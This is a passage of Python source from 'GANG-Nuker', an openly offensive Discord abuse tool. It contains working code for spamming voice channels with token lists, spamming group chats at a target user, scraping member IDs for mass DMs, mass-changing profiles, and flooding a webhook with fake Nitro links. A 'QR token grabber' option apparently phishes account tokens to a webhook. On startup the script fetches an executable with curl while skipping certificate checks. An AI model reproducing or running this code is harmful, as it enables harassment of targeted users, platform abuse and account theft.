        channel = int(input("\n[\x1b[95m>\x1b[95m\x1B[37m] Voice Channel ID: "))
        server = int(input("[\x1b[95m>\x1b[95m\x1B[37m] Server ID: "))
        deaf = input("[\x1b[95m>\x1b[95m\x1B[37m] Defean: (y/n)? ")
        if deaf == "y":
          deaf = True
          if deaf == "n":
            deaf = False
        mute = input("[\x1b[95m>\x1b[95m\x1B[37m] Mute: (y/n)? ")
        if mute == "y":
          mute = True
          if mute == "n":
            mute = False
        stream = input("[\x1b[95m>\x1b[95m\x1B[37m] Stream: (y/n)? ")
        if stream == "y":
          stream = True
          if stream == "n":
            stream = False
        video = input("[\x1b[95m>\x1b[95m\x1B[37m] Video: (y/n)? ")
        if video == "y":
          video = True
          if video == "n":
            video = False

        executor = ThreadPoolExecutor(max_workers=int(1000))
        def run(token):
          while True:
            ws = WebSocket()
            ws.connect("wss://gateway.discord.gg/?v=8&encoding=json")
            hello = loads(ws.recv())
            heartbeat_interval = hello['d']['heartbeat_interval']
            ws.send(dumps({"op": 2,"d": {"token": token,"properties": {"$os": "windows","$browser": "Discord","$device": "desktop"}}}))
            ws.send(dumps({"op": 4,"d": {"guild_id": server,"channel_id": channel,"self_mute": mute,"self_deaf": deaf, "self_stream?": stream, "self_video": video}}))
            ws.send(dumps({"op": 18,"d": {"type": "guild","guild_id": server,"channel_id": channel,"preferred_region": "singapore"}}))
            ws.send(dumps({"op": 1,"d": None}))
            sleep(0.1)

        i = 0

        for token in tokenlist:
          executor.submit(run, token)
          i+=1
          print("[\x1B[32m>\x1B[32m\x1B[37m] Joined VC")
          sleep(0.01)
        yay = input("\n[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER to Stop VC Spammer!")



#   PATCH NOTES
    if choice == '17':
        Spinner()
        setTitle(f"Patch Notes    |    ")
        SlowPrint("\n[\x1b[95m>\x1b[95m\x1B[37m] UPDATED Patch Notes:\n")
        print(f'\n[\x1b[95m#\x1b[95m\x1B[37m] Server MassDM      (OUTDATED) - (adding API v10 in next UPDATE!)\n[\x1b[95m#\x1b[95m\x1B[37m] DM Spammer         (OUTDATED) - (adding captcha key API in next UPDATE!)\n[\x1b[95m#\x1b[95m\x1B[37m] Reaction Spammer   (OUTDATED) - (Need to update the headers!)')

        time.sleep(1)
        exit = input('\n\n[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
        exit = clear()
        exit = spammer()



#   ABOUT/ACTIVITY
    if choice == '18':
        Spinner()
        setTitle(f"About/Activity    |    ")
        http.client._is_legal_header_name = re.compile(b'[^\\s][^:\\r\\n]*').fullmatch
        print(f'\n[\x1b[95m1\x1b[95m\x1B[37m] About Changer')
        print(f'[\x1b[95m2\x1b[95m\x1B[37m] Activity Status Changer')
        changg = input('\n[\x1b[95m>\x1b[95m\x1B[37m] Choice: ')
        if changg == '1':

            def abouttt(token, abbb):
                try:
                    headers = secondHeader(token)
                    rd = requests.patch('https://discord.com/api/v9/users/@me', headers=headers, json={'bio': abbb})
                    if rd.status_code == 200:
                        print(f'[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Done')
                    else:
                        print(
                            f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Error")
                except:
                    print('Error!')

            tokens = open('tokens.txt', 'r').read().splitlines()
            ab = input(f'[{m}>]{Fore.RESET} About: ')
            for token in tokens:
                threading.Thread(target=abouttt, args=(token, ab)).start()

        if changg == '2':
            def activity(token, act):
                ws = websocket.WebSocket()
                actt = 'Online'
                ws.connect('wss://gateway.discord.gg/?v=6&encoding=json')
                gjs = {'name': act,
                       'type': 0}
                auth = {'op': 2,
                        'd': {'token': token,
                              'properties': {'$os': sys.platform,
                                             '$browser': 'RTB',
                                             '$device': f"{sys.platform} Device"},
                              'presence': {'game': gjs,
                                           'status': actt,
                                           'since': 0,
                                           'afk': False}},
                        's': None,
                        't': None}
                ws.send(json.dumps(auth))
                print(f'[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Activity Status: {act}')

            tokens = open('tokens.txt', 'r').read().splitlines()
            text = input('[\x1b[95m>\x1b[95m\x1B[37m] Activity Status: ')
            for token in tokens:
                threading.Thread(target=activity, args=(token, text)).start()

        time.sleep(1)
        exit = input(f'[\x1b[95m>\x1b[95m\x1B[37m] Press Enter: ')
        exit = clear()
        exit = spammer()



#   SERVER LOOKUP
    if choice == '19':
        Spinner()
        setTitle(f"Server Lookup    |    ")
        exec(open('utilities/Plugins/Server_Lookup.py').read())



#   TOKEN INFOMATION
    if choice == '20':
        Spinner()
        token = input(
        f'\n[\x1b[95m>\x1b[95m\x1B[37m] Account Token: ')
        validateToken(token)
        utilities.Plugins.Token_Info.Info(token)



#   STATUS CHANGER
    if choice == '21':
        Spinner()
        setTitle(f"Status Changer    |    ")
        def ChangeStatus(token, status):
            session = requests.Session()
            headers = {
                'authorization': token,
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.306 Chrome/78.0.3904.130 Electron/7.1.11 Safari/537.36',
                'content-type': 'application/json'
            }
            data = '{"custom_status":{"text":"' + status + '"}}'
            r = session.patch('https://discordapp.com/api/v6/users/@me/settings', headers=headers, data=data)
            print('[\x1B[32m>\x1B[32m] Done')

        tokens = open('tokens.txt', 'r').read().splitlines()
        status = input('\n[\x1b[95m>\x1b[95m\x1B[37m] Status?: ')
        for token in tokens:
            threading.Thread(target=ChangeStatus, args=(token, status)).start()

        time.sleep(1)
        exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
        exit = clear()
        exit = spammer()



#   GROUPCHAT SPAMMER
    if choice == '22':
        Spinner()
        setTitle(f"GroupChat Spammer    |    ")
        token = input('\n[\x1b[95m>\x1b[95m\x1B[37m] Token: ')
        UserID = input('[\x1b[95m>\x1b[95m\x1B[37m] User ID: ')
        group = input('[\x1b[95m>\x1b[95m\x1B[37m] Group Names: ')
        manygr = int(input('[\x1b[95m>\x1b[95m\x1B[37m] How Many Groups: '))

        headers = mainHeader(token)


        for i in range(manygr):
            try:
                r = requests.post('https://discord.com/api/v9/users/@me/channels', headers=headers,
                                  json={"recipients": []})

                jsr = json.loads(r.content)
                groupID = jsr['id']
                time.sleep(0.5)
                r1 = requests.patch(f'https://discord.com/api/v9/channels/{groupID}', headers=headers,
                                    json={'name': group})
                if r1.status_code == 200:
                    print(f'[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Group created')

                with open("data/groups.txt", "w") as groupID:
                    groupID.write(jsr['id'] + '\n')

            except:
                print(f'[{Fore.LIGHTRED_EX}-{Fore.RESET}] RateLimited for {jsr["retry_after"]} seconds'), time.sleep(jsr['retry_after'])

            scrIds = random.choice(open('data/groups.txt').readlines())
            grID = scrIds.strip('\n')
            r2 = requests.put(f'https://discord.com/api/v9/channels/{grID}/recipients/{UserID}',
                              headers={'Authorization': token})
            if r2.status_code == 204:
                print(f'[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Group Members: {UserID}')

        time.sleep(1)
        exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
        exit = clear()
        exit = spammer()



#   AUTO LOGIN
    if choice == '23':
        Spinner()
        setTitle(f"Token Auto Login    |    ")
        token = input(
            f'\n[\x1b[95m>\x1b[95m\x1B[37m] Account Token: ')
        validateToken(token)
        utilities.Plugins.Auto_Login.TokenLogin(token)



#   DM DELETER
    if choice == '24':
            Spinner()
            setTitle(f"DM Deleter    |    ")
            token = input(
            f'\n[\x1b[95m>\x1b[95m\x1B[37m] Account Token: ')
            validateToken(token)
            processes = []
            channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
            if not channelIds:
                print(f"[\x1b[95m>\x1b[95m\x1B[37m] This Token Has 0 Dms to Delete!")
                sleep(2)
                spammer()
            for channel in [channelIds[i:i+3] for i in range(0, len(channelIds), 3)]:
                    t = threading.Thread(target=utilities.Plugins.DM_Deleter.DmDeleter, args=(token, channel))
                    t.start()
                    processes.append(t)
            for process in processes:
                process.join()
            input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')



#   TOKEN GENERATOR
    if choice == '25':
        Spinner()
        setTitle(f"Token Generator    |    ")
        gh = input(f"""
Token Generator is in the Paid Version of GANG-Nuker!\nIf You Are Wanting to Purchase Make Sure to Checkout the Offical GANG-Nuker Website!
                                   
[\x1b[95m1\x1b[95m\x1B[37m] GANG-Nuker Website
[\x1b[95m2\x1b[95m\x1B[37m] Exit
  
[\x1b[95m>\x1b[95m\x1B[37m] Choice?: """)

        if gh in ['01','1']:
            webbrowser.open('https://gangnuker.org')
        elif gh in ['02','2']:
            exit = spammer()
        else:
         print('')



#   NITRO GENERATOR
    if choice == '26':
        Spinner()
        setTitle(f"Nitro Generator    |    ")
        
        webhooklink = str(input(f"\n[\x1b[95m>\x1b[95m\x1B[37m] Webhook URL: "))
        
        count = 0

        webhook = "~~WEBHOOK_URL~~""".replace("~~WEBHOOK_URL~~", webhooklink)

        while True:
            try:
                code = ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(24))
                post = {"content":"https://discord.com/billing/promotions/"+code}
                head = {

                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36", 
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
                        'content-type' : 'application/json'
                    }
                count += 1
                print(f'[{g}>{Fore.RESET}] Generated Nitro | [{count}]')
                s = requests.post(webhook, json=post, headers=head)
            except:
                print(f"[{r}!{Fore.RESET}] ERROR!")
                break




#   QR TOKEN GRABBER
    elif choice == '27':
        Spinner()
        setTitle(f"QR Token Grabber    |    ")
        WebHook = input(
            f'\n[\x1b[95m>\x1b[95m\x1B[37m] Webhook URL: ')
        validateWebhook(WebHook)
        utilities.Plugins.QR_Grabber.QR_Grabber(WebHook)   



#   MEMBER ID SCRAPER
    if choice == '28':
            Spinner()
            setTitle(f"Member ID Scraper    |    ")
            tukan = input('\n[\x1b[95m>\x1b[95m\x1B[37m] Account Token: ')
            guildd = input('[\x1b[95m>\x1b[95m\x1B[37m] Server ID: ')
            chann = input('[\x1b[95m>\x1b[95m\x1B[37m] Channel ID: ')
            bot = discum.Client(token=tukan)

            def closefetching(resp,guildid):
             if bot.gateway.finishedMemberFetching(guildid):
                lenmembersfetched = len(bot.gateway.session.guild(guildid).members)
                print(str(lenmembersfetched))
                bot.gateway.removeCommand({'function':closefetching, 'params':{'guildid':guildid}})
                bot.gateway.close()

            def getmembers(guildid,channelid):
                 bot.gateway.fetchMembers(guildid, channelid, keep='all',wait=1)
                 bot.gateway.command({'function':closefetching,'params':{'guildid':guildid}})
                 bot.gateway.run()
                 bot.gateway.resetSession()
                 return bot.gateway.session.guild(guildid).members

            members = getmembers(guildd, chann)
            memberids = []

            for memberId in members:
                memberids.append(memberId)

            cls()

            with open('data/massdm_IDs.txt','w') as ids:
                for element in memberids:
                    ids.write(element + '\n')    

            print(f'\n[\x1b[95m>\x1b[95m\x1B[37m] Finished Scraping {len(memberids)} Members!\n(The members have already been put into the correct files for spamming!)')

            time.sleep(1)
            exit = input('\n[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
            exit = clear()
            exit = spammer()



#   PFP CHANGER
    if choice == '29':
        Spinner()
        setTitle(f"PFP Changer    |    ")
        def change_pfp():

            tokens = open('tokens.txt', 'r').read().splitlines()
            token = random.choice(tokens)

            picture = [f for f in os.listdir("utilities/Avatars/") if isfile(join("utilities/Avatars/", f))]
            random_picture = random.choice(picture)

            with open(f'utilities/Avatars/{random_picture}', "rb") as image_file:
                encoded_string = base64.b64encode(image_file.read())

            headers = {
                'authority': 'discord.com',
                'accept': '*/*',
                'accept-language': 'en-GB,en;q=0.9',
                'authorization': token,
                'cookie': '__dcfduid=904754d01e0f11edbc8e137cc7c473ca; __sdcfduid=904754d11e0f11edbc8e137cc7c473caaf269406fe90d738955d66c8929cd997a08c8669ef42a295aac84cc43230a150; __cf_bm=uXHYoYl9KmWotP8UeGBa6PejMQCeibzDkDYmf2MsY9s-1660728773-0-AS+XIQ7NNSyCZ4NlcXTdL0oVGueHXZdj2D0+lSifopWh7sUykquNKC/lA3UpNMqVrjBh728hF1wibQBsBEFv69LTkEam4T1CLerS8v2rjGVq0ZwVEPXbnDz7iPfEX8AvEA==; locale=en-GB',
                'origin': 'https://discord.com',
                'referer': 'https://discord.com/@me',
                'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
                'x-discord-locale': 'en-GB',
                'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLUdCIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwNC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTA0LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjE0MjAwMCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0=',
            }

            json = {
                'avatar': f"data:image/png;base64,{(encoded_string.decode('utf-8'))}",
            }

            r = requests.patch('https://discord.com/api/v9/users/@me', headers=headers, json=json)
            if r.status_code == 200:
                print(f"\n[{g}+{Fore.RESET}] Successfully Changed PFP | {token}")
            else:
                print(f"[{r}!{Fore.RESET}] Error...")


        threads = input("\n[\x1b[95m>\x1b[95m\x1B[37m] Amount of PFP?: ")
        for i in range(int(threads)):
            threading.Thread(target=change_pfp).start()



#   ABOUT
    if choice == '30':
        Spinner()
        setTitle(f"About    |    ")
        Write.Print("\nHello, thanks for using GANG-Nuker!\nif you run into any problems make sure to let me know asap!\nDiscord: ††#9999\nGithub: https://github.com/TT-Tutorials\nWebsite: https://gangnuker.org\n\n", Colors.purple_to_blue, interval=0.015)

        time.sleep(1)
        exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
        exit = clear()
        exit = spammer()



#   THREADS
    if choice == '31':
            Spinner()
            setTitle(f"Threads: [{threads}]    |    ")
            print(f"\n[\x1b[95m#\x1b[95m\x1B[37m] Current Thread: {lr}{threads}{Fore.RESET}")
            try:
                amount = int(
                    input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] Thread Amount: '))
            except ValueError:
                print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] | Invalid Amount!')
                sleep(1.5)
                spammer()
            if amount >= 40:
                print(f"[{Fore.RED}ERROR{Fore.RESET}] | Having {Fore.RED}{amount}{Fore.RESET} Will Cause Ratelimited, Try Something Lower...!")
                sleep(4)
                spammer()
            elif amount >= 15:
                print(f"[\x1b[95m>\x1b[95m\x1B[37m] Having More Than 15 Threads Can Cause Lag and Ratelimit... [{Fore.RED}{amount}{Fore.RESET}]\nContinue With High Threads?")
                yesno = input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] y/n?: ')
                if yesno.lower() != "y":
                    sleep(0.5)
                    spammer()
            threads = amount
            SlowPrint(f"\nChanged Thread to: [\x1b[95m{amount}\x1b[95m\x1B[37m]")
            sleep(1.5)
            spammer()



#   EXIT
    if choice == '32':
        Spinner()
        exit = True if input(f"\n[{Fore.LIGHTMAGENTA_EX}>{Fore.RESET}] Are You Sure You Want To Exit GANG-Nuker? Y/N: ").lower() == "y" else spammer() or "n" == sys.exit(0)
    else:
        print(f"")
        time.sleep(0)
        return spammer()




#   AUTO DOWNLOAD DRIVERS
if __name__ == "__main__":
                import sys
                setTitle(f"Dowloading Drivers    |    ")
                os.system("""if not exist "./chromedriver.exe" echo [+] Downloading Drivers: """)
                os.system("""if not exist "./chromedriver.exe" curl -#fkLo "./chromedriver.exe" "https://github.com/TT-Tutorials/addons/raw/main/chromedriver.exe" """)
                if os.path.basename(sys.argv[0]).endswith("exe"):
                    search_for_updates()
                    if not os.path.exists(getTempDir()+"\\gang_proxies"):
                       clear()
                else:
                    search_for_updates()
                    if not os.path.exists(getTempDir()+"\\gang_proxies"):
                        clear()
spammer()
